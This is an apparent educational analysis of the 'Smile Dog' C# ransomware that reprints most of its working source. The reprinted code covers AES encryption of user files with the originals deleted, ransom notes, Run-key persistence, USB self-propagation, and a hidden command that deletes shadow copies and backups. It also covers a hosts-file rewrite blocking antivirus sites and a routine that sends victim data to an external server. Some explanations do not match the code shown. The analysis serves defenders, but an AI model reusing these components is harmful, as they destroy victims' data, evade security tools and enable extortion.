# Analysis of the Smile Dog Ransomware 🕵️‍♂️

The provided C# code is a malicious ransomware program named "Smile Dog." It encrypts files, spreads via USB drives, modifies system settings, and communicates with a remote server. Below, I break down **key components** of the code, illustrating each with the relevant source code, followed by an explanation of its functionality and impact. Emojis are used in section titles for clarity.

---

## 🔐 1. File Encryption (`EncryptFile` and `encryptDirectory`)

### Source Code
```csharp
public void EncryptFile(string file, string password)
{
    try
    {
        FileInfo fileInfo = new FileInfo(file);
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        bytes = SHA256.Create().ComputeHash(bytes);
        string text = Base64Encode(fileInfo.Name);
        byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
        char[] invalidFileNameChars = Path.GetInvalidFileNameChars();
        foreach (char oldChar in invalidFileNameChars)
        {
            text = text.Replace(oldChar, '_');
        }
        File.WriteAllBytes(fileInfo.DirectoryName + "\\" + fileInfo.Name + ".sMilE", bytes2);
        File.Delete(file);
        Console.WriteLine("encrypted: " + file + " >> " + file + ".sMilE");
        encryptedfiles = encryptedfiles + file + Environment.NewLine;
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}

public void encryptDirectory(string location, string password)
{
    try
    {
        string text = "si";
        string[] source = new string[1] { "//aqui_extensiones" };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int i = 0; i < files.Length; i++)
        {
            string fileName = Path.GetFileName(files[i]);
            string extension = Path.GetExtension(files[i]);
            string text2 = "no";
            if (extension == ".sMilE")
            {
                continue;
            }
            if (text2 == "no")
            {
                if (!(fileName == "SMILEJPG.txt"))
                {
                    if (text == "si")
                    {
                        EncryptFile(files[i], password);
                    }
                    else if (source.Contains(extension))
                    {
                        EncryptFile(files[i], password);
                    }
                }
                continue;
            }
            long length = new FileInfo(files[i]).Length;
            if (fileName == "SMILEJPG.txt")
            {
                continue;
            }
            if (text == "si")
            {
                if (length <= 2147483648u)
                {
                    EncryptFile(files[i], password);
                }
            }
            else if (source.Contains(extension) && length <= 2147483648u)
            {
                EncryptFile(files[i], password);
            }
        }
        for (int i = 0; i < directories.Length; i++)
        {
            encryptDirectory(directories[i], password);
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}

public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
{
    byte[] result = null;
    byte[] salt = new byte[8] { 3, 4, 2, 6, 5, 1, 7, 8 };
    using (MemoryStream memoryStream = new MemoryStream())
    {
        using RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
        }
        result = memoryStream.ToArray();
    }
    return result;
}
```

### Explanation
- The `EncryptFile` method encrypts files using AES-256 in CBC mode. It derives a key from a password (hardcoded as `allhailsmile` after base64 decoding) using `Rfc2898DeriveBytes` with a fixed salt and 1000 iterations.
- Encrypted files are saved with a `.sMilE` extension, and the original files are deleted.
- The `encryptDirectory` method recursively encrypts files in specified directories (Desktop, Downloads, Documents, Pictures, Music, Videos, 3D Objects, and OneDrive), skipping files with `.sMilE` extensions or named `SMILEJPG.txt`.
- Only files smaller than 2GB are encrypted to avoid performance issues.
- The `AES_Encrypt` method handles the encryption process, using a fixed salt for key derivation.

### Impact
- Users lose access to their files, which are replaced with encrypted versions.
- The hardcoded password means decryption is theoretically possible with the code, but file deletion makes recovery challenging without backups.

---

## 📜 2. Ransom Note Creation (`mensaje` and `messageCreator`)

### Source Code
```csharp
public void mensaje(string location)
{
    try
    {
        nota_mostrar = "si";
        string[] contents = new string[1] { "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE SMILE DOG RANSOMWARE CONTACT SMILEDOGISTHEBESTMATE@gmail.com".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
            .Replace("%DATE%", DateTime.Now.ToString())
            .Replace("%PRIVATEIP%", GetLocalIPAddress())
            .Replace("%ENCRIPTEDFILES%", encryptedfiles) };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int i = 0; i < directories.Length; i++)
        {
            messageCreator(directories[i]);
        }
        File.WriteAllLines(location + "\\SMILEJPG.txt", contents);
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}

public void messageCreator(string location)
{
    try
    {
        nota_mostrar = "si";
        string[] contents = new string[1] { "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE SMILE DOG RANSOMWARE CONTACT SMILEDOGISTHEBESTMATE@gmail.com".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
            .Replace("%DATE%", DateTime.Now.ToString())
            .Replace("%PRIVATEIP%", GetLocalIPAddress())
            .Replace("%ENCRIPTEDFILES%", encryptedfiles) };
        string[] directories = Directory.GetDirectories(location);
        File.WriteAllLines(location + "\\SMILEJPG.txt", contents);
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

### Explanation
- The `mensaje` and `messageCreator` methods create a ransom note (`SMILEJPG.txt`) in each targeted directory.
- The note includes a message demanding contact with `SMILEDOGISTHEBESTMATE@gmail.com`, with placeholders for:
  - A unique victim ID (`ID`).
  - Username, computer name, date, private IP address, and list of encrypted files.
- The note is opened to display the message to the victim.

### Impact
- Informs victims their files are encrypted, pressuring them to contact the attacker for decryption, a hallmark of ransomware.

---

## 🔄 3. Persistence (`inicio_void`)

### Source Code
```csharp
public void inicio_void()
{
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
    registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
}
```

### Explanation
- Adds a registry key to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` to execute the malware (disguised as `discord.exe`) on system startup.
- Copies the malware to `%LocalAppData%\discord.exe` for persistence.

### Impact
- Ensures the ransomware runs every time the system boots, maintaining its presence.

---

## 💾 4. USB Propagation (`USB`)

### Source Code
```csharp
public void USB()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string location = Assembly.GetEntryAssembly().Location;
    string contents = "@echo off" + Environment.NewLine + "copy \"" + location + "\" A:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" B:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" D:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" E:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" F:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" G:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" H:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" I:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" J:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" K:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" L:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" M:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" N:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" Ñ:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" O:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" P:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" Q:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" R:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" S:\\nombre.exe" + Environment.NewLine + Environment.NewLine + "copy \"" + location + "\" T:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" U:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" V:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" W:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" X:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" Y:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" Z:\\nombre.exe" + Environment.NewLine + "exit";
    File.WriteAllText(folderPath + "\\usb_maker.bat", contents);
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = folderPath + "\\usb_maker.bat";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    Process.Start(processStartInfo);
}
```

### Explanation
- Creates a batch file (`usb_maker.bat`) in `%AppData%` that copies the malware to all available drive letters (A: to Z:) as `nombre.exe`.
- Executes the batch file in hidden mode to propagate to removable drives.

### Impact
- Spreads the ransomware to other systems via USB drives, increasing its reach.

---

## 🛠️ 5. System Modifications

### Source Code
```csharp
[DllImport("shell32.dll")]
private static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);

public void fondo()
{
    try
    {
        File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\fondo_antiguo.jpg", overwrite: true);
        random = CreateId(30);
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        if (File.Exists(folderPath + "\\image.jpg"))
        {
            SystemParametersInfo(20u, 0u, folderPath + "\\image.jpg", 3u);
            File.Delete(folderPath + "\\image.jpg");
        }
        else
        {
            File.WriteAllBytes(folderPath + "\\image" + random + ".jpg", Resources.wallpaper_jpg);
            SystemParametersInfo(20u, 0u, folderPath + "\\image" + random + ".jpg", 3u);
            File.Delete(folderPath + "\\image" + random + ".jpg");
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine("ERRORRRRRRRRRRRRRRRR: " + ex.Message);
    }
}

public void borrar()
{
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = " /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
    Process.Start(processStartInfo);
}
```

### Explanation
- **Recycle Bin Emptying**: Uses `SHEmptyRecycleBin` to empty the Recycle Bin without confirmation, preventing recovery of deleted files.
- **Wallpaper Change**: The `fondo` method sets a new desktop wallpaper from an embedded resource (`Resources.wallpaper_jpg`), deleting the temporary image afterward.
- **Backup Deletion**: The `borrar` method deletes Volume Shadow Copies, disables recovery options, and removes the Windows Backup catalog using `cmd.exe`.
- **Hosts File Modification** (from `start` method):
  ```csharp
  File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", "127.0.0.1 localhost" + Environment.NewLine + "127.0.0.1 files.avast.com" + /* ... many more antivirus and security sites ... */ + "127.0.0.1 www.youtube.com");
  ```
  Blocks access to antivirus and security websites by redirecting them to `127.0.0.1`.

### Impact
- Prevents file recovery via backups or shadow copies.
- Blocks security software updates, evading detection.
- Alters the user experience with a new wallpaper.

---

## 🗑️ 6. Self-Destruction (`autodestruir`)

### Source Code
```csharp
public void autodestruir()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string location = Assembly.GetEntryAssembly().Location;
    string text = File.ReadAllText(folderPath + "\\uac_location");
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = "/c del \"" + location + "\" /F /Q";
    Process.Start(processStartInfo);
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
    processStartInfo2.FileName = "cmd.exe";
    processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo2.Arguments = "/c del \"" + text + "\" /F /Q";
    Process.Start(processStartInfo2);
    try
    {
        if (File.Exists(folderPath + "\\uac_location"))
        {
            File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
            File.Delete(File.ReadAllText(folderPath + "\\uac_location"));
        }
        else
        {
            File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

### Explanation
- Deletes the original executable and related files (e.g., `uac_location`) using `cmd.exe`.
- Copies the malware to `%LocalAppData%\discord.exe` to maintain persistence while hiding its original location.

### Impact
- Evades detection by removing traces of the original malware file.

---

## 🌐 7. Network Communication (`conectar`)

### Source Code
```csharp
public static void conectar()
{
    try
    {
        string text = "https://unlatched-sticks.000webhostapp.com/data.php";
        Console.WriteLine("string enlace creado");
        Console.WriteLine("string informacion creado");
        string address = text + "data.php?info=" + ((Control)Program.text).Text;
        Console.WriteLine("strings fusionados");
        WebClient webClient = new WebClient();
        Console.WriteLine("webclient creado");
        webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
        Console.WriteLine("webclient headers");
        Stream stream = webClient.OpenRead(text + "data.txt");
        Console.WriteLine("data");
        StreamReader streamReader = new StreamReader(stream);
        Console.WriteLine("reader");
        string text2 = streamReader.ReadToEnd();
        Console.WriteLine("s");
        stream.Close();
        Console.WriteLine("data close");
        streamReader.Close();
        Console.WriteLine("reader close");
        if (text2.Contains(ID))
        {
            Console.WriteLine("ID ya en el servidor");
            return;
        }
        string text3 = new WebClient().DownloadString(address);
        Console.WriteLine("enviado");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
        conectar();
    }
}
```

### Explanation
- Sends victim information (ID, username, computer name, date, private IP, encryption status) to `https://unlatched-sticks.000webhostapp.com/data.php`.
- Checks if the victim’s ID exists on the server to avoid duplicates.
- Uses a fake user-agent to blend with normal traffic.
- Retries indefinitely on failure.

### Impact
- Allows the attacker to track infected systems and coordinate ransom demands.

---

## 🛡️ 8. Process Protection

### Source Code
```csharp
[DllImport("ntdll.dll", SetLastError = true)]
private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

[DllImport("user32.dll")]
private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);

private static void Main(string[] args)
{
    try
    {
        ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
        // ... rest of Main method ...
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

### Explanation
- Uses `NtSetInformationProcess` to set the process as non-critical, preventing it from being flagged as critical.
- Hides the console window with `ShowWindow` to run silently.

### Impact
- Makes the malware harder to detect or terminate by running in the background.

---

## 🎲 9. Miscellaneous

### Source Code
```csharp
public static string CreateId(int length)
{
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    while (0 < length--)
    {
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZYWxsaGFpbHNtaWxl0"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZYWxsaGFpbHNtaWxl0".Length)]);
    }
    return stringBuilder.ToString();
}

public void cmd2()
{
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = "/c @echo off & echo sigueme en github: https://github.com/AnderMoralDiaz!!! & start https://github.com/AnderMoralDiaz";
    Process.Start(processStartInfo);
}
```

### Explanation
- **Unique ID Generation**: `CreateId` generates a 40-character ID using a custom alphabet for victim identification, stored in `%AppData%\ID`.
- **GitHub Promotion**: `cmd2` displays and opens the attacker’s GitHub URL (`https://github.com/AnderMoralDiaz`), likely as a taunt.

### Impact
- The ID tracks victims, while the GitHub link serves as a signature.

---

## ⚠️ Malicious Intent and Ethical Concerns

- **Extortion**: Encrypts files and demands ransom.
- **Evasion**: Blocks antivirus updates, deletes backups, and hides its presence.
- **Spread**: Propagates via USB drives.
- **Damage**: Deletes recovery options and empties the Recycle Bin.

---

## 🛠️ Technical Issues

- **Hardcoded Password**: Uses `allhailsmile`, making decryption possible but file deletion complicates recovery.
- **Error Handling**: Broad `try-catch` blocks ensure resilience but may cause unpredictable behavior.
- **Incomplete Features**: Empty `percodigo` method and placeholder tray notification text.
- **Obfuscation**: Vague variable names (e.g., `nota_mostrar`) and mixed languages (Spanish/English).

---

## 🛡️ Recommendations

1. **Do Not Execute**: Analyze in a sandbox or VM.
2. **Isolate System**: Disconnect from networks if infected.
3. **Backup and Recovery**: Use offline backups; avoid paying ransom.
4. **Report**: Notify law enforcement or cybersecurity agencies.
5. **Analyze Safely**: Use tools like IDA Pro or Ghidra.
6. **Educate Users**: Train on avoiding unknown executables.

---

## 📜 Legal and Ethical Notes

- **Illegal**: Creating or using ransomware is a crime.
- **Purpose**: This analysis is for educational and defensive purposes.
- **Disclosure**: Report to antivirus vendors if found in the wild.

---

*Generated on April 24, 2025*